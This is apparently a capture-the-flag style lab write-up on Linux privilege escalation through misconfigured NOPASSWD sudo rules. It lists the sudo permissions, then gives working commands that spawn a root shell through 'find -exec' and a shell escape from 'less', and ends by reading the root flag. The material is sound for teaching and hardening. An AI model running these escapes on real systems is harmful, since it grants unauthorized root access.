
# Privesc with sudo permission

For this practical class, I have a direct SSH access with a low privilege account.

---

## Summary

1. [Sudo list](#sudo-list)
2. [Privilege escalation](#Privilege-escalation)

---

## Sudo list

We begin by listing sudo permissions with ```sudo -l``` command :

```
eleve@debian:~$ sudo -l
Entrées Defaults correspondant pour eleve sur debian :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

L'utilisateur eleve peut utiliser les commandes suivantes sur debian :
    (root) NOPASSWD: /usr/sbin/apache2, /usr/bin/find, /usr/bin/less, /usr/bin/more, /usr/sbin/tcpdump, /usr/bin/vim, /usr/bin/man
```

Here is the list : ```(root) NOPASSWD: /usr/sbin/apache2, /usr/bin/find, /usr/bin/less, /usr/bin/more, /usr/sbin/tcpdump, /usr/bin/vim, /usr/bin/man```
It means that we can use all of thoses commands with root privileges without needing to use password.

---

## Privilege escalation

And here we have a lot of choice for our privilege escalation, thanks to [GTFOBins](https://gtfobins.github.io/) we can see a list of command we can use in order to abuse all of thoses bad configurated sudo permissions.
Here is the detail for two weak points.

<details>

<summary>find privesc</summary>

We can use the ```find``` command in order to get a root shell :

```sudo find . -exec /bin/sh \; -quit```

It simply use the find command with sudo permission, and then escape from the find command in order to execute a shell, but this shell is executed as sudo, so with root permissions.

```
# whoami
root
```

Then we simply need to get our flag :

```
# cat  /root/flag.txt
Félicitations, vous êtes root !
```

---

</details>


<details>
  
<summary>less privesc</summary>

There is an another way with ```less``` to get a root shell.

Simply use the less command with sudo permission like this :

```
sudo less /etc/profile
```

Then use the exclamation point to escape and use a command :

```
!/bin/sh
```

And here we, executing again a shell with sudo permission so as root :

```
# whoami
root
```

Then we simply need to get our flag :

```
# cat  /root/flag.txt
Félicitations, vous êtes root !
```

---

</details>
